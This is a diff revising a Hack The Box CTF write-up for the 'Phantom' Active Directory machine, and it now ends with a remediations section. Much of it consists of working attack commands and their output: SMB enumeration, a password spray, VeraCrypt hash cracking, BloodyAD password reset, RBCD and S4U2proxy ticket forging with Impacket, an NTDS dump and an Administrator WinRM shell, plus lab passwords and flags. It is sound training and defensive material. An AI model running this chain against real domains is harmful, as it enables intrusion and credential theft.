@@ -1,27 +1,40 @@
-## Overview
-
-The "Phantom" CTF simulates a Windows Active Directory network, mirroring typical corporate environments. This write-up details the steps taken to gain unauthorized access and ultimately compromise the domain controller. It is presented in a hybrid style, blending a typical CTF walkthrough with elements of a professional penetration testing report.
-
-As such, not all enumeration steps that were performed are documented exhaustively.
-
-## Tools Used
-
-*   **nmap:** [https://nmap.org/](https://nmap.org/)
-*   **NetExec:** [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
-*   **BloodHound (legacy):** [https://github.com/SpecterOps/BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy)
-*   **RustHound:** [https://github.com/NH-RED-TEAM/RustHound](https://github.com/NH-RED-TEAM/RustHound)
-*   **VeraCrypt:** [https://veracrypt.io/en/Home.html](https://veracrypt.io/en/Home.html)
-*   **hashcat:** [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
-*   **BloodyAD:** [https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)
-*   **Impacket:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
----
-
 ## Technical Writeup
 
 ### Introduction
 
-"Phantom" is a medium-difficulty Windows Active Directory machine on the **Hack The Box** platform. The objective was to achieve both **user** and **Root/Administrator** access. This document details the methodology and tools used to compromise the target system.
+The "Phantom" CTF simulates a Windows Active Directory network, mirroring typical corporate environments. This write-up details the steps taken to gain unauthorized access and ultimately compromise the domain controller. It is presented in a hybrid style, blending a typical CTF walkthrough with elements of a professional penetration testing report. As such, not all enumeration steps that were performed are documented exhaustively.
 
+The objective on this medium-difficulty machine was to achieve both **user** and **Root/Administrator** access, following a logical attack path from reconnaissance to full domain compromise.
+
+---
+#### High-Level Attack Chain
+
+```mermaid
+graph TD
+    A[Initial Recon: Nmap/SMB Enum] --> B[Clue in Public Share: Default PW from PDF];
+    B --> C[Password Spray: ibryant Access];
+    C --> D[Discovery: BloodHound Paths + VeraCrypt Backup];
+    D --> E[Crack/Mount Container: svc_sspr Creds];
+    E --> F[Privilege Escalation: WinRM Shell -> User Flag];
+    F --> G[Lateral Movement: RBCD Exploit via wsilva];
+    G --> H[Impact: NTDS Dump -> Admin Hash -> Root Flag];
+```
+
+
+### Tools Used
+
+| Tool | Purpose | Key Features Used | Link |
+| :--- | :--- | :--- | :--- |
+| **nmap** | Port/service discovery | `-sC` `-sV` for default scripts and versioning | [nmap.org](https://nmap.org/) |
+| **NetExec** | SMB enum/exploitation | RID brute-force, share listing, spidering | [GitHub](https://github.com/Pennyw0rth/NetExec) |
+| **BloodHound** | AD graph analysis | Path visualization (via RustHound ingest) | [GitHub](https://github.com/SpecterOps/BloodHound-Legacy) |
+| **RustHound** | AD data collection | ZIP output for BloodHound | [GitHub](https://github.com/NH-RED-TEAM/RustHound) |
+| **VeraCrypt** | Encrypted volume mounting | Container decryption | [veracrypt.io](https://veracrypt.io/en/Home.html) |
+| **hashcat**| Password cracking | Mode 13722 for VeraCrypt headers | [hashcat.net](https://hashcat.net/hashcat/) |
+| **BloodyAD**| AD manipulation | `set password`, `add rbcd` | [GitHub](https://github.com/CravateRouge/bloodyAD) |
+| **Impacket**| Kerberos/SMB attacks | `getTGT.py`, `getST.py`, `changepasswd.py` | [GitHub](https://github.com/fortra/impacket) |
+
+---
 ### Initial Enumeration and Reconnaissance
 
 The initial reconnaissance phase focused on gathering comprehensive information about the target system at `10.129.234.63`.
@@ -53,8 +66,6 @@ With SMB (port 445) confirmed as open, further enumeration of shares and users w
 
 **1. Null/Guest Access Check:**
 
-An initial attempt was made to authenticate with null and guest credentials.
-
 *   **Command**:
     ```zsh
     nxc smb 10.129.234.63 -u 'a' -p '' --log Outputs/nxc/guest_scan.txt
@@ -68,30 +79,17 @@ The output confirmed that both guest and null bindings were successful, indicati
 
 **2. Listing Shares:**
 
-Leveraging guest access, available SMB shares were listed.
-
 *   **Command**:
     ```zsh
     nxc smb 10.129.234.63 -u 'a' -p '' --shares --log Outputs/nxc/guest_shares.txt
     ```
-*   **Output**:
+*   **Output Snippet**:
     ```zsh
-    SMB         10.129.234.63   445    DC               [*] Enumerated shares
-    SMB         10.129.234.63   445    DC               Share           Permissions     Remark
-    SMB         10.129.234.63   445    DC               -----           -----------     ------
-    SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
-    SMB         10.129.234.63   445    DC               C$                              Default share
-    SMB         10.129.234.63   445    DC               Departments Share
-    SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
-    SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share
     SMB         10.129.234.63   445    DC               Public          READ
-    SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
     ```
 The `Public` share with `READ` permissions was noted for further investigation.
 
 **3. Listing Users via RID Bruteforce:**
-
-While direct user listing was unsuccessful, a Relative ID (RID) bruteforce attack was performed to identify domain users.
 
 *   **Command**:
     ```zsh
@@ -99,39 +97,22 @@ While direct user listing was unsuccessful, a Relative ID (RID) bruteforce attac
     ```
 *   **Output Snippet**:
     ```
-    <SNIP>
     SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
     SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
-    SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
-    <SNIP>
     ```
-This scan provided a valuable list of domain users and groups, offering insight into the domain's structure. The `svc_sspr` user (RID 1103) was of particular interest, as it often indicates a service account for Self-Service Password Reset.
+This scan provided a valuable list of domain users and groups. The `svc_sspr` user was of particular interest, as service accounts often have unique privileges.
 
 **4. Exploring Shares:**
-
-The accessible shares were spidered to list and download files.
 
 *   **Command**:
     ```zsh
     nxc smb 10.129.234.63 -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./spider --log spider_shares.txt
     ```
-*   **Output**:
-    ```zsh
-    SPIDER_PLUS 10.129.234.63   445    DC               [*] Total files found:    1
-    SPIDER_PLUS 10.129.234.63   445    DC               [*] File unique exts:     1 (eml)
-    SPIDER_PLUS 10.129.234.63   445    DC               [*] Downloads successful: 1
-    ```
-A single file, `tech_support_email.eml`, was discovered in the `Public` share.
-
-![EML Preview](Outputs/Screenshots/support_eml.png)
-
-The email from `alucas@phantom.vl` to `techsupport@phantom.vl` contained a PDF attachment.
+A single file, `tech_support_email.eml`, was discovered in the `Public` share. The email contained a PDF attachment revealing a default password: `Password: Ph4nt0m@5t4rt!`.
 
 ![Welcome Template PDF](Outputs/Screenshots/onboarding_pdf.png)
-
-This PDF revealed a default password: `Password: Ph4nt0m@5t4rt!`, a critical finding for a potential password spray attack.
-
-### Active Exploitation
+---
+### Initial Access
 
 #### Password Spray
 
@@ -143,15 +124,14 @@ The discovered password was used in a password spraying attack against the enume
     ```
 *   **Output Snippet**:
     ```zsh
-    <SNIP>
-    SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
     SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
-    SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
-    </SNIP>
     ```
-A successful login was achieved for the user `ibryant`, providing valid domain credentials.
+A successful login was achieved for the user `ibryant`, providing valid domain credentials and establishing an initial foothold.
 
-### Further Enumeration
+---
+### Discovery
+
+With authenticated access, the enumeration process was repeated to uncover new information.
 
 #### Exploring Shares with New Credentials
 
@@ -161,11 +141,9 @@ A successful login was achieved for the user `ibryant`, providing valid domain c
     ```
 *   **Output**:
     ```zsh
-    SMB         10.129.234.63   445    DC               Share           Permissions     Remark
-    SMB         10.129.234.63   445    DC               -----           -----------     ------
     SMB         10.129.234.63   445    DC               Departments Share READ
     ```
-With `ibryant`'s credentials, `READ` access was gained to the `Departments Share`. Spidering this share revealed several files, including an interesting backup file in the `IT/Backup/` directory: `IT_BACKUP_201123.hc`. The presence of a VeraCrypt installer in the same share suggested this was an encrypted container.
+`ibryant` had `READ` access to the `Departments Share`. Spidering this share revealed an interesting backup file: `IT/Backup/IT_BACKUP_201123.hc`, which appeared to be a VeraCrypt encrypted container.
 
 #### BloodHound Analysis
 
@@ -178,7 +156,7 @@ With `ibryant`'s credentials, `READ` access was gained to the `Departments Share
 
 **Immediate Findings:**
 
-*   **High-Value Target (HVT):** The `svc_sspr` account was identified as a key target. It held membership in `REMOTE MANAGEMENT USERS` and possessed `ForceChangePassword` rights over the user `rnichols`, who is a member of the `ICT Security` group.
+*   **High-Value Target (HVT):** The `svc_sspr` account was identified as a key target. It held membership in `REMOTE MANAGEMENT USERS` and possessed `ForceChangePassword` rights over `wsilva`, a member of the `ICT Security` group.
     ![SVC_SSPR Control Path](Outputs/Screenshots/svc_sspr_control.png)
 
 *   **Path to Admin:** The `ICT Security` group had a direct path to domain compromise via a Resource-Based Constrained Delegation (RBCD) misconfiguration (`AddAllowedToAct`) on the Domain Controller.
@@ -186,6 +164,7 @@ With `ibryant`'s credentials, `READ` access was gained to the `Departments Share
 
 This analysis made compromising the `svc_sspr` account the primary objective for privilege escalation.
 
+---
 ### Privilege Escalation
 
 #### Cracking the VeraCrypt Container
@@ -213,6 +192,12 @@ Based on a hint from the CTF platform, a targeted wordlist was generated.
 *   **Result**:
     ```zsh
     hash:Phantom2023!
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Mode........: 13722 (VeraCrypt SHA512 + XTS 1024 bit (legacy))
+    Hash.Target......: hash
+    Time.Started.....: Fri Oct 17 09:09:08 2025 (6 secs)
+    Time.Estimated...: Fri Oct 17 09:09:14 2025 (0 secs)
     ```
 
 #### Mounting the Container and Finding Credentials
@@ -238,7 +223,7 @@ A recursive search for the string "password" within the mounted files yielded a 
 
 #### Pivoting with New Credentials
 
-The discovered password `gB6XTcqVP5MlP7Rc` was sprayed against the user list.
+The discovered password `gB6XTcqVP5MlP7Rc` was sprayed against the user list, yielding a hit on our HVT.
 
 *   **Command**:
     ```zsh
@@ -250,7 +235,6 @@ The discovered password `gB6XTcqVP5MlP7Rc` was sprayed against the user list.
     [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
     <SNIP>
     ```
-This provided credentials for our high-value target, `svc_sspr`.
 
 #### Obtaining User Flag
 
@@ -267,9 +251,10 @@ As `svc_sspr` is a member of `REMOTE MANAGEMENT USERS`, a WinRM shell was establ
     ```
 The user flag was successfully obtained.
 
-### Domain Compromise
+---
+### Lateral Movement and Impact
 
-The previously identified attack path via RBCD was now executed.
+The previously identified attack path via RBCD was now executed to achieve domain compromise.
 
 **1. Take Control of `wsilva`**
 
@@ -282,7 +267,7 @@ The `ForceChangePassword` privilege was used to reset the password for `wsilva`.
 
 **2. Configure RBCD**
 
-With control over `wsilva`, who has `AddAllowedToAct` rights, the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the Domain Controller (`DC$`) was modified to include `wsilva`.
+With control over `wsilva` (who has `AddAllowedToAct` rights), the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the Domain Controller (`DC$`) was modified to include `wsilva`.
 
 *   **Command**:
     ```zsh
@@ -291,14 +276,15 @@ With control over `wsilva`, who has `AddAllowedToAct` rights, the `msDS-AllowedT
 
 **3. S4U2Proxy Attack**
 
-To leverage the RBCD primitive with a user account, a series of steps were required to perform an S4U2proxy attack.
+To leverage the RBCD with a user account, which is our only path forward due to our `ms-DS-MachineAccountQuota` being 0, a series of steps were required to perform an S4U2proxy attack, as detailed by [James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).
 
-*   **Calculate NTLM Hash**: The NTLM hash of `wsilva`'s new password was calculated to force an RC4-based TGT. (Note: You may not need to do this, in my case, I needed to force a RC4-based TGT, which should yield a 32-character session key, as a plaintext password Summer2025 generates AES256 64-character key, which is not compatible with the next steps.)
+*   **Calculate NTLM Hash**: The NTLM hash of `wsilva`'s new password was calculated.
+    *Note: You may not need to do this. In my case, I needed to force a RC4-based TGT, which yields a 32-character session key. Using a plaintext password (`Summer2025`) generated a AES256 64-character key, which is not compatible with the subsequent steps.*
     ```zsh
     NTLM=$(echo -n 'Summer2025' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')
     ```
 
-*   **Request TGT**: A Ticket Granting Ticket for `wsilva` was requested using the hash.
+*   **Request TGT**: A Ticket Granting Ticket for `wsilva` was requested using the NTLM hash.
     ```zsh
     getTGT.py -hashes :$NTLM phantom.vl/wsilva -dc-ip 10.129.234.63
     ```
@@ -309,12 +295,12 @@ To leverage the RBCD primitive with a user account, a series of steps were requi
     # Output: [*] Ticket Session Key            : 098710b2cb0989cb38839638c24cd154
     ```
 
-*   **Update Password Hash**: `wsilva`'s password hash was changed to the extracted TGT session key. This is a critical step that allows the user account to be used for delegation without requiring an SPN.
+*   **Update Password Hash**: `wsilva`'s password hash was changed to the extracted TGT session key. This is a critical step that allows the user account to be used for delegation without requiring a Service Principal Name (SPN).
     ```zsh
     changepasswd.py -newhashes :098710b2cb0989cb38839638c24cd154 phantom.vl/wsilva:Summer2025@10.129.234.63
     ```
 
-*   **Request Service Ticket**: A service ticket was requested to impersonate the `Administrator` on the Domain Controller.
+*   **Request Service Ticket**: A service ticket was requested to impersonate the `Administrator` on the Domain Controller's CIFS service.
     ```zsh
     KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
     ```
@@ -343,10 +329,59 @@ Using the dumped hash, a WinRM shell was established as the Administrator.
     *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
     60d108263adf1769459769c8ddb6efab
     ```
-The root flag was obtained, signifying full domain compromise.
+    The root flag was obtained, signifying full domain compromise.
+---
 
 ### Summary of Attack Path
 
-*   **Initial Access**: A password (`Ph4nt0m@5t4rt!`) was discovered in a PDF on a public SMB share. A password spray attack using this password granted access as the user `ibryant`.
-*   **Privilege Escalation**: Credentials for the `svc_sspr` account were found inside an encrypted VeraCrypt container, which was accessible to `ibryant`. The password for the container was cracked using a targeted wordlist.
-*   **Domain Admin**: The `svc_sspr` account had privileges to reset the password of `wsilva`, a member of the `ICT Security` group. This group had delegation rights (`AddAllowedToAct`) on the domain controller, which was exploited via a Resource-Based Constrained Delegation attack to impersonate the domain administrator and achieve full system compromise.
+*   **Initial Access**: A default password (`Ph4nt0m@5t4rt!`) discovered in a PDF on a public SMB share allowed for a successful password spray, granting access as the user `ibryant`.
+*   **Privilege Escalation**: Credentials for the `svc_sspr` account were found inside an encrypted VeraCrypt container accessible to `ibryant`. The container password was cracked using a targeted wordlist.
+*   **Domain Admin**: The `svc_sspr` account had privileges to reset the password of `wsilva`, a member of the `ICT Security` group. This group's delegation rights (`AddAllowedToAct`) on the domain controller were exploited via a Resource-Based Constrained Delegation attack to impersonate the domain administrator and achieve full system compromise.
+
+---
+
+### Remediations
+
+**Guest/Null Session Exposure**  
+Anonymous or guest access to SMB shares and RPC endpoints enables unauthenticated reconnaissance such as RID cycling or enumeration of user and group information.  
+
+**Remediation:**  
+Disable null sessions through Group Policy (e.g. `Network access: Restrict anonymous access to Named Pipes and Shares` and `Network access: Do not allow anonymous enumeration of SAM accounts and shares`). Where possible, enforce SMB signing and restrict guest access entirely via `Network access: Restrict anonymous access`.  
+
+---
+
+**Default Password Reuse**  
+The presence of a static default password in an onboarding or setup document poses a critical risk, as it may allow predictable account compromise.  
+
+**Remediation:**  
+Eliminate the use of static default passwords. Implement secure onboarding procedures that use randomised temporary passwords or one-time links. Enforce strong password policies (length, complexity, and rotation) and consider Just-In-Time (JIT) account provisioning where feasible.  
+
+---
+
+**RBCD Misconfigurations**  
+Improper configuration of Resource-Based Constrained Delegation (RBCD) rights, such as the presence of `msDS-AllowedToActOnBehalfOfOtherIdentity` entries for non-privileged accounts, can allow lateral movement or privilege escalation.  
+
+**Remediation:**  
+Regularly audit RBCD configurations using tools such as BloodHound or PowerView. Remove unauthorised or unnecessary `msDS-AllowedToActOnBehalfOfOtherIdentity` entries, particularly on high-value assets like Domain Controllers and tier-0 servers. Implement change control processes to detect and review delegation-related ACL modifications.  
+
+---
+
+**Insecure Backup Storage**  
+Sensitive backup data stored on accessible network shares, even when encrypted, remains at risk of exposure or offline brute-force attacks.  
+
+**Remediation:**  
+Store backups in an isolated and access-controlled location, separate from standard user and administrative shares. Manage encryption keys securely using a dedicated secrets management platform or Hardware Security Module (HSM). Rotate keys periodically and ensure that backup credentials and encryption material are not stored alongside the backups themselves.  
+
+---
+
+**Principle of Least Privilege Violations**  
+The `svc_sspr` account had excessive rights, including `ForceChangePassword` privileges over a privileged group member, which violates least privilege principles and enables potential privilege escalation.  
+
+**Remediation:**  
+Perform regular Active Directory privilege audits to identify and remove excessive or inherited rights. Restrict service accounts to only the permissions strictly required for their intended function. Where possible, separate administrative roles and apply tiered access models (Tier 0–2) to minimise risk from compromised service accounts.  
+
+---
+### References
+
+*   **Abusing Kerberos Delegation**: [The Hacker Recipes - Resource-Based Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
+*   **Exploiting RBCD with a User Account**: [James Forshaw - Exploiting RBCD Using a Normal User Account](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
